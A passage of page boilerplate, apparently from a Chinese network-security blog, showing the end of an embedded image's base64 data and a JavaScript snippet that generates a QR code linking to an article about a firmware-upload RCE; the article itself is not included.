X31Cci8Y15z1ha7Pfewfax2foesyWgvjWtA52PtVj8zZd3/hMBCLFl5zAmsg15z76aqXDATiauuK2qodOgehzxoYuaMeyCWDD2xv1tBxEN0IiPzNbR9eq0KLcg7GHhAcdLxkIN7w34qzr/vXBwIx/bwJPzn3uJyXD9ELUDgYsD3xOQF7DiIGsmzwvUfhkEwEsK0JHZ2GkXMuo9aw/fpA8sLLv38CayD3z+ilimEgvjpn+Ozu3Af69YXRd1/rhRA6+TJrMoo/Ws7bh30v1Tgn32auQmuEzss/M2uE1kDsA/rf3qFzw0BUvOy6E2gDgT4luO/PtuynQVjpxMtyDmLNzNmH85w1jyJEL6As0b5kQHuzViyrCqDrYO9X+opTb1sbSCVc3OtPYA3k9Wc+XfFfAAAA//+N/t3nAAAABklEQVQDALRVeaf4SqoMAAAAAElFTkSuQmCC)

手机扫码阅读

网络安全


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-firmware-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 